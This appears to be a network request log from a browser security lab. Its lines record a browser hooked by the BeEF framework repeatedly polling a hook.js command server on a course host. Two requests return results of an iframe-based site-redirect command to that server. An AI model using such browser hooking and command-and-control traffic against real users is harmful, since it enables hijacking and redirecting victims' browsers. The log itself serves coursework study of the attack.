245e8e20174976e717ab00f7f7f8b54d	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539565
c30183468a8e9c34084a2ef1a74ba261	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539566
2af190edba87d55b30407b6cb6b0ced8	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539567
e8583b25bca3111d267d9ef1588f25ff	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539568
9b77e8c9b7e96d50c8e2c372aa53412b	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539569
2500028fe2c84c82f1e056b2f38bdb87	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539570
80550f9459c706a5b94d086e20e73a49	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539571
54c1fd32be49dc703093e9289b84584d	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539572
fcf8798f6231c6f8e1e71ddc2f17a8e6	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539573
0f4f4e154a5728acbe1459980c447e50	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539574
207052a3a39b531ebfd83f254bac1f77	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539575
3d1ac7988d4b8958135b60a03cf448c4	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539576
35a9bd7d0cee5925f2455921ad4dde98	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539577
2665842dba19ad8d06f6f2ff04fae1e5	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539578
0e571263979bfa53709030825994663d	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539579
60e0d94adf5ac9c7b3a1c4e50ca1d591	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539580
9c8bf67dd20ccf08e57ccf088a14f799	Other	http://cs6264.gtisc.gatech.edu:60623/ui/media/images/favicon.ico
19a6f412a7364c51f1d3a37b5b528bb7	Document	https://archlinux.org/
9a75cb19ed5e6e19a4e2c2c1ab01217e	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=3&pid=1&pc=1&d=W3siY2lkIjoyLCJyZXN1bHRzIjoicmVzdWx0PUlmcmFtZSBzdWNjZXNzZnVsbHkgY3JlYXRlZCEiLCJzdGF0dXMiOjAsImhhbmRsZXIiOiIvY29tbWFuZC9zaXRlX3JlZGlyZWN0X2lmcmFtZS5qcyJ9XQ%3D%3D&_=1763088539581
78170d4f5ca270575c3dbaa26e249462	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539582
305ae247f9ad6c9a7cc13b7835f89884	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539583
b5589f98190970c6f7a4ea6ac4486dff	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539584
919699a25e985b0c073e1acc124eef92	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539585
126aa7dd8908e7ac3ee47bfd0db07ef8	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539586
3c997e76cb93b4a01fcf0816658c43ce	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539587
b14956d12ac252c51ca9c9b73eda86cb	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539588
2dae168a2e66143ab3c0b7174022021b	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539589
a53b43856468680dab6625ff43d392e9	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539590
8af23fd4cb231ca8170ce54716ec89b4	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539591
612d5bac5186eee25a1e190733288fb4	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539592
40ce6141c11e68abd0d155ba11cfa079	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539593
e46682802181f605192e36e25ac304e9	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=4&pid=1&pc=1&d=W3siY2lkIjozLCJyZXN1bHRzIjoicmVzdWx0PUlmcmFtZSBzdWNjZXNzZnVsbHkgY3JlYXRlZCEiLCJzdGF0dXMiOjAsImhhbmRsZXIiOiIvY29tbWFuZC9zaXRlX3JlZGlyZWN0X2lmcmFtZS5qcyJ9XQ%3D%3D&_=1763088539594
033986ad070c7eea63078ce628f08f8d	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539595
1e39d04845f43ce685278179ecae760a	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539596
c2a29c24d707b10d55db92a37d0c6952	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539597
e0c0c7c575a5186ca4595b82b26058ad	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539598
b66ecb49c8681b889be26c15b6e33c5e	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539599
61b3995884c5fb3dbb10b4635187d489	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js?BEEFHOOK=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&_=1763088539600
